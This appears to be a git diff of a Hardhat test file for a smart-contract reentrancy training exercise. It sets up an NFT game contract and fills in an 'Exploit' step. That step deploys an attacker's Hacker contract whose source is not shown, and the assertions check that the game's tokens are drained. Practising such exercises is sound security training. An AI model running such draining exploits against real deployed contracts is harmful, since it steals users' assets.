@@ -13,36 +13,46 @@ describe('Reentrancy Exercise 4', function () {
       'contracts/reentrancy-4/CryptoEmpireToken.sol:CryptoEmpireToken',
       deployer
     );
-    this.cryptoEmpireToken = await CryptoEmpireTokenFactory.deploy();
+    this.token = await CryptoEmpireTokenFactory.deploy();
 
     const CryptoEmpireGameFactory = await ethers.getContractFactory(
       'contracts/reentrancy-4/CryptoEmpireGame.sol:CryptoEmpireGame',
       deployer
     );
-    this.cryptoEmpireGame = await CryptoEmpireGameFactory.deploy(this.cryptoEmpireToken.address);
+    this.game = await CryptoEmpireGameFactory.deploy(this.token.address);
 
     // Giving 1 NFT to each user
-    this.cryptoEmpireToken.mint(user1.address, 1, 0);
-    this.cryptoEmpireToken.mint(user2.address, 1, 1);
-    this.cryptoEmpireToken.mint(attacker.address, 1, 2);
+    this.token.mint(user1.address, 1, 0);
+    this.token.mint(user2.address, 1, 1);
+    this.token.mint(attacker.address, 1, 2);
 
-    // The CryptoEmpire game gained many users already and has some NFTs either staked or listed in it
-    for(let i=0; i <= 5; i++) {
-      this.cryptoEmpireToken.mint(this.cryptoEmpireGame.address, 20, i);
+    // The game gained many users already and has some NFTs either staked or listed in it
+    for (let i = 0; i <= 5; i++) {
+      this.token.mint(this.game.address, 20, i);
     }
-
   });
 
   it('Exploit', async () => {
     /** CODE YOUR SOLUTION HERE */
-    
+
+    const HackerFactory = await ethers.getContractFactory(
+      'contracts/reentrancy-4/Hacker.sol:Hacker',
+      attacker
+    );
+    this.hacker = await HackerFactory.deploy(this.game.address, this.token.address);
+
+    await this.token.connect(attacker).setApprovalForAll(this.hacker.address, true);
+    // await this.token.connect(attacker).safeTransferFrom(attacker.address, this.hacker.address, 2, 1,"");
+    await this.hacker.simpleCall();
+
+
   });
 
   after(async () => {
 
     // Attacker stole all the tokens from the game contract
-    expect(await this.cryptoEmpireToken.balanceOf(attacker.address, 2)).to.be.at.least(20)
-    expect(await this.cryptoEmpireToken.balanceOf(this.cryptoEmpireGame.address, 2)).to.be.equal(0)
+    expect(await this.token.balanceOf(attacker.address, 2)).to.be.at.least(20)
+    expect(await this.token.balanceOf(this.game.address, 2)).to.be.equal(0)
 
   });
 });
